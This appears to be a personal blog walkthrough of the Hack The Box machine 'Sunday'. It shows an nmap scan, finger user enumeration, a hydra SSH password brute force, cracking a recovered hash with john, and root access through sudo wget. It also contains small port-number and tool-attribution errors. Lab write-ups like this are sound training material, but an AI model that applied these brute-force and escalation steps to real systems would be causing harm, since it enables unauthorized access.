---

title: "Sunday"
date: 2023-08-10T11:30:03+00:00
tags: ["web","linux","finger"]
categories: ["hackthebox"]
author: "0x0Pwn"
image: "/HTB/Sunday.png"
comments: false
description: "This is a friendly linux machine that is vulnerable to a user enumeration on port 79 (finger)."

---

## Room Information

- Room name: Sunday
- Difficulty level: Medium
- Room link: https://app.hackthebox.com/machines/Sunday

![Untitled](/HTB/Sunday.png)

## Tools Used

- Nmap
- searchsploit
- finger-user-enum.pl
- hydra
- john
- ssh

## Port Scanning

Other room, other port scan.

```bash
# Nmap 7.94 scan initiated Thu Aug 31 11:48:49 2023 as: nmap -p- --open -sCV -sS --min-rate 5000 -vvv -n -Pn -oN escaneo 10.10.10.76
Nmap scan report for 10.10.10.76
Host is up, received user-set (0.13s latency).
Scanned at 2023-08-31 11:48:49 EDT for 124s
Not shown: 64490 filtered tcp ports (no-response), 1040 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE  REASON         VERSION
79/tcp    open  finger?  syn-ack ttl 59
| fingerprint-strings: 
|   GenericLines: 
|     No one logged on
|   GetRequest: 
|     Login Name TTY Idle When Where
|     HTTP/1.0 ???
|   HTTPOptions: 
|     Login Name TTY Idle When Where
|     HTTP/1.0 ???
|     OPTIONS ???
|   Help: 
|     Login Name TTY Idle When Where
|     HELP ???
|   RTSPRequest: 
|     Login Name TTY Idle When Where
|     OPTIONS ???
|     RTSP/1.0 ???
|   SSLSessionReq, TerminalServerCookie: 
|_    Login Name TTY Idle When Where
|_finger: No one logged on\x0D
111/tcp   open  rpcbind  syn-ack ttl 63 2-4 (RPC #100000)
515/tcp   open  printer  syn-ack ttl 59
6787/tcp  open  ssl/http syn-ack ttl 59 Apache httpd 2.4.33 ((Unix) OpenSSL/1.0.2o mod_wsgi/4.5.1 Python/2.7.14)
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.33 (Unix) OpenSSL/1.0.2o mod_wsgi/4.5.1 Python/2.7.14
| ssl-cert: Subject: commonName=sunday
| Subject Alternative Name: DNS:sunday
| Issuer: commonName=sunday/organizationName=Host Root CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-12-08T19:40:00
| Not valid after:  2031-12-06T19:40:00
| MD5:   6bd3:4b32:c05a:e5fe:a8c8:61f0:4361:414a
| SHA-1: a5eb:c880:968c:84aa:10b2:a944:bad2:56ca:aed5:b66a
| -----BEGIN CERTIFICATE-----
| MIIC4DCCAcqgAwIBAgIHAIqqcz45jjALBgkqhkiG9w0BAQswKDEVMBMGA1UEChMM
| SG9zdCBSb290IENBMQ8wDQYDVQQDEwZzdW5kYXkwHhcNMjExMjA4MTk0MDAwWhcN
| MzExMjA2MTk0MDAwWjARMQ8wDQYDVQQDEwZzdW5kYXkwggEiMA0GCSqGSIb3DQEB
| AQUAA4IBDwAwggEKAoIBAQC67wVPVDRPU/Sahp2QnHx2NlMUQrkyBJrr4TSjS9v6
| /DFKqf3m2XnYuKyFl9BAO8Mi+Hz3ON4nZWmigZGX6LnJpci6whB89pLZdcogruB8
| YMyGuP8y2v3orEBLQ5NrcP6fcKLMp+6PXurvuZDgPH+oXHJyp/w//pkBROQRC0oN
| 8dx7Zq2t4ZfDiqhgw1j79V7kZNOjKp8gU1HmQ/BjYEaOfVZNwuTVyqUtfcjuxIio
| JEHaVmhNV9Xp9DAOLBFuTXpsJe3anSjGGP0DWMyNOps2VrZUyJwC22U5jlcp7Rj/
| WWE5gnm6ClH44DXlKMIt8O2vq0MfqvvGeSIFbSOPb6Q3AgMBAAGjKjAoMBEGA1Ud
| EQQKMAiCBnN1bmRheTATBgNVHSUEDDAKBggrBgEFBQcDATALBgkqhkiG9w0BAQsD
| ggEBAC/f3nN6ur2oSSedYNIkf6/+MV3qu8xE+Cqt/SbSk0uSmQ7hYpMhc8Ele/gr
| Od0cweaClKXEhugRwfVW5jmjJXrnSZtOpyz09dMhZMA9RJ9efVfnrn5Qw5gUriMx
| dFMrAnOIXsFu0vnRZLJP7E95NHpZVECnRXCSPjp4iPe/vyl1OuoVLBhoOwZ8O7zw
| WlP/51SiII8LPNyeq+01mCY0mv3RJD9uAeNJawnFwsCo/Tg9/mjk0zxUMaXm80Bb
| qsSmST23vYwuPw3c/91fJI4dWb7uEZJa55hRIU0uMPOLOUpN1kKkGPO+7QCzfedc
| WPptRhU+2UMGhFXHyGV5EJp2zvc=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
| http-title: Solaris Dashboard
|_Requested resource was https://10.10.10.76:6787/solaris/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
22022/tcp open  ssh      syn-ack ttl 63 OpenSSH 7.5 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:00:94:32:18:60:a4:93:3b:87:a4:b6:f8:02:68:0e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDsG4q9TS6eAOrX6zI+R0CMMkCTfS36QDqQW5NcF/v9vmNWyL6xSZ8x38AB2T+Kbx672RqYCtKmHcZMFs55Q3hoWQE7YgWOJhXw9agE3aIjXiWCNhmmq4T5+zjbJWbF4OLkHzNzZ2qGHbhQD9Kbw9AmyW8ZS+P8AGC5fO36AVvgyS8+5YbA05N3UDKBbQu/WlpgyLfuNpAq9279mfq/MUWWRNKGKICF/jRB3lr2BMD+BhDjTooM7ySxpq7K9dfOgdmgqFrjdE4bkxBrPsWLF41YQy3hV0L/MJQE2h+s7kONmmZJMl4lAZ8PNUqQe6sdkDhL1Ex2+yQlvbyqQZw3xhuJ
|   256 da:2a:6c:fa:6b:b1:ea:16:1d:a6:54:a1:0b:2b:ee:48 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAII/0DH8qZiCfAzZNkSaAmT39TyBUFFwjdk8vm7ze+Wwm
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port79-TCP:V=7.94%I=7%D=8/31%Time=64F0B682%P=x86_64-pc-linux-gnu%r(Gene
SF:ricLines,12,"No\x20one\x20logged\x20on\r\n")%r(GetRequest,93,"Login\x20
SF:\x20\x20\x20\x20\x20\x20Name\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20TTY\x20\x20\x20\x20\x20\x20\x20\x20\x20Idle\x20\x20\x2
SF:0\x20When\x20\x20\x20\x20Where\r\n/\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\nGET\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\
SF:?\r\nHTTP/1\.0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:?\?\?\r\n")%r(Help,5D,"Login\x20\x20\x20\x20\x20\x20\x20Name\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20TTY\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20Idle\x20\x20\x20\x20When\x20\x20\x20\x20Where\r\nHELP\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\?\?\?\r\n")%r(HTTPOptions,93,"Login\x20\x20\x20\x20\x20\x20\x20Name\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20TTY\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20Idle\x20\x20\x20\x20When\x20\x20\x20\x20Where\
SF:r\n/\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\?\?\?\r\nHTTP/1\.0\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\?\?\?\r\nOPTIONS\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\?\?\?\r\n")%r(RTSPRequest,93,"Login\x20\x20
SF:\x20\x20\x20\x20\x20Name\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20TTY\x20\x20\x20\x20\x20\x20\x20\x20\x20Idle\x20\x20\x20\x2
SF:0When\x20\x20\x20\x20Where\r\n/\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\nOPTIONS\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\nRTSP/1\.0\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\n")%r(SS
SF:LSessionReq,5D,"Login\x20\x20\x20\x20\x20\x20\x20Name\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20TTY\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20Idle\x20\x20\x20\x20When\x20\x20\x20\x20Where\r\n\x16\x03\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\?\?\?\r\n")%r(TerminalServerCookie,5D,"Login\x20\x20\x20\x20\x20\
SF:x20\x20Name\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:TTY\x20\x20\x20\x20\x20\x20\x20\x20\x20Idle\x20\x20\x20\x20When\x20\x20
SF:\x20\x20Where\r\n\x03\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\n");

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Aug 31 11:50:53 2023 -- 1 IP address (1 host up) scanned in 124.78 seconds
```

As you can see in this machine we can find a lot of open ports but the first one (76, finger), the web page (80) and the ssh (22022).

## Enumeration

As on all the machines I do, I set out to do web directory analysis with gobuster and wfuzz, but on this one I didn't get any interesting results.

Here is a screenshot of the web page:

![Untitled](/HTB/web-sunday.png)

## Exploiting

Following on from the above what I did was to investigate port 79, and quickly found some information. The vulnerability was that I could enumerate users through this. 

website link → https://book.hacktricks.xyz/network-services-pentesting/pentesting-finger

So I did the following:

```bash
perl finger-user-enum.pl -U /usr/share/dirbuster/wordlists/names.txt -t 10.10.10.76
```

![Untitled](/HTB/finger-sunday.png)

So the next thing I did was to try with hydra to connect via ssh to the machine, and these were the results:

```bash
hydra -I -l sammy -P '/usr/share/wordlists/rockyou.txt' 10.10.10.76 ssh -s 22022
```

![Untitled](/HTB/hydra-sunday.png)

And I found some users like: sammy, sanny, root, etc.

![Untitled](/HTB/ssh-sunday.png)

So I was in 😎

## Treatment of tty

```bash
 script /dev/null -c bash
 ctrl + z
 stty raw -echo; fg
 restet xterm
 export TERM=xterm

```

## Escalating Privileges

As always I do :

```bash
 sudo -l
 cat /etc/crontab
 find / -perm -4000 2>/dev/null
 find / -type f -writable 2>/dev/null
 bash procmon.sh
 lsb_release -a
 uname -a
 id
 getcap -r / 2>/dev/null
 netstat -na -p tcp
 ps faux
 (try to do a cat of /.bash_history)
```

When I did a cat on **Sunny** folder `.bash_history`  I found that Sunny did a cat of a backup file, so I did the same and… 😇

![Untitled](/HTB/cat-sunday.png)

I found a hash of the ssh password of **Sammy**, so I returned to my kali machine and cracked the hash with john:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

```bash
┌──(kali㉿kali)-[~/HTB/sunday]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (sha256crypt, crypt(3) $5$ [SHA256 256/256 AVX2 8x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:01:24 0.95% (ETA: 15:48:51) 0g/s 1902p/s 1902c/s 1902C/s darly..biodome
0g 0:00:01:25 0.96% (ETA: 15:49:37) 0g/s 1901p/s 1901c/s 1901C/s bindi1..Lonnie
0g 0:00:01:42 1.17% (ETA: 15:47:31) 0g/s 1919p/s 1919c/s 1919C/s pigglett..mp3speler
cooldude!        (sammy)     
1g 0:00:01:46 DONE (2023-08-31 13:23) 0.009417g/s 1919p/s 1919c/s 1919C/s domonique1..chrystelle
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Then I connect by ssh to **Sammy** user and did a sudo -l, and I found that I can use wget as root, so I went to gtfobins and search about them 😎

website → https://gtfobins.github.io/gtfobins/wget/#sudo

![Untitled](/HTB/sudo-sunday.png)

![Untitled](/HTB/l-sunday.png)

So at this point I was root 😇

## Lessons Learned

- What insights did you gain from the room?
    
    I learn about the finger port, 79.
    
- Where there any novel tools or techniques employed?
    
    Exploting finger port and cracking the ssh pass with Hydra.
